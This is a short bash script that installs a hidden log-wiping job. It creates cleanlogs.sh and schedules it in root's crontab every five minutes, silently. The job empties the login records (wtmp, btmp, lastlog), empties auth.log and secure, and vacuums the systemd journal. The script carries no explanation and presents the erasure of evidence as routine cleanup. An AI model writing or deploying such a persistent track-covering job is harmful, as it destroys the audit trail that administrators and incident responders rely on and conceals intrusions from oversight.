#!/bin/bash

SCRIPT_DIR="/home/ubuntu/scripts"
SCRIPT_PATH="$SCRIPT_DIR/cleanlogs.sh"

mkdir -p "$SCRIPT_DIR"

cat > "$SCRIPT_PATH" << 'EOF'
#!/bin/bash

for f in /var/log/wtmp /var/log/btmp /var/log/lastlog; do
    [ -f "$f" ] && truncate -s 0 "$f"
done

[ -f /var/log/auth.log ] && truncate -s 0 /var/log/auth.log
[ -f /var/log/secure ] && truncate -s 0 /var/log/secure

journalctl --rotate
journalctl --vacuum-size=1M
journalctl --vacuum-time=1s
EOF

chmod +x "$SCRIPT_PATH"

TMP_CRON=$(mktemp)
sudo crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" > "$TMP_CRON"
echo "*/5 * * * * $SCRIPT_PATH >/dev/null 2>&1" >> "$TMP_CRON"
sudo crontab "$TMP_CRON"
rm "$TMP_CRON"

